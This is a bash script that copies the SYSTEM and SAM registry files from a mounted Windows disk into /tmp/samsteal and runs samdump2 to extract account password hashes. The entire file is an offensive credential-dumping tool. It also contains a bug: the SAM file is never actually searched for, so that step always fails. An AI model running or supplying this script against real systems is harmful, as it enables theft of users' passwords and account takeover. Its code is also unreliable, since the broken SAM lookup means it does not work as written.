#!/bin/bash
# Grab password hashes from windows machine

usage() {
  echo -e "$0 <mount>\nmount - Windows disk location"
}

printinfo() {
  echo "[*] $@"
}

if test $# != 1; then
  usage
  exit
fi

WINDOWS_DISK="$1"
SYSTEM_FILE=""
SAM_FILE=""
TMPDIR="/tmp/samsteal"

# Make tmpdir if not found
if test ! -d $TMPDIR; then
  mkdir $TMPDIR
fi

# Find the system and sam files
printinfo "Searching for SYSTEM file..."
SYSTEM_FILE=$( find $WINDOWS_DISK -name SYSTEM 2>/dev/null )
if test -z "$SYSTEM_FILE"; then
  printinfo "ERROR: Didn't find SYSTEM file"
else
  printinfo "INFO: Got the SYSTEM file"
fi

printinfo "Searching for SAM file..."
if test -z "$SAM_FILE"; then
  printinfo "ERROR: Didn't find SAM file"
else
  printinfo "INFO: Got the SAM file"
fi

# Copy the SAM and SYSTEM files to /tmp and get checksums
if test ! -z "$SYSTEM_FILE"; then
  cp "$SYSTEM_FILE" $TMPDIR/windows_SYSTEM
  md5sum $TMPDIR/windows_SYSTEM
fi

if test ! -z "$SAM_FILE"; then
  cp "$SAM_FILE" $TMPDIR/windows_SAM
  md5sum $TMPDIR/windows_SAM
fi

# Run samdump2
samdump2 -o $TMPDIR/windows-dumped.hashes $TMPDIR/windows_SYSTEM $TMPDIR/windows_SAM
printinfo "All done"
